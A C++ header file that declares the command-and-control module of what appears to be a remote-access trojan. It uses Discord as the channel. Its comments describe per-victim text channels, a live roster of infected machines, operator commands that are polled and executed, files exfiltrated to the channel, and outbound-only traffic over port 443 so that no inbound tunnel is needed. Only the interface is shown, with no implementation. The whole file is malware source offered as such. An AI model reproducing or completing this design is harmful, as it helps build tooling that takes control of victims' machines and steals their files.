#pragma once
// Command channel: Discord-based C2.
//   - heartbeat: one webhook message per machine, edited in place, so the
//     channel shows a live roster ("who is online" at a glance)
//   - commands: polled from a channel through the Discord bot API (read
//     access), only accepted from the configured operator id
//   - replies and files: posted back through the webhook (write access)
// No inbound tunnel anywhere: the client initiates everything over 443.
#include <cstdint>
#include <string>
#include <vector>

namespace c2 {

// true when a bot token is configured
bool enabled();

// Make sure the per-victim text channel exists (creates #pc-<host> when the
// bot is in a guild and no channel id is pinned). Safe to call before the loop.
bool prepare();

// Post a file into the victim's channel through the bot. Returns false when
// the channel is not ready or Discord rejects the upload.
bool deliver(const std::string& filename, const std::vector<uint8_t>& data,
             const std::string& caption);

// Blocking command loop. Heartbeats on a timer, polls commands every few
// seconds, executes and replies. Never returns while configured (the process
// stays alive on purpose).
void run_forever();

} // namespace c2
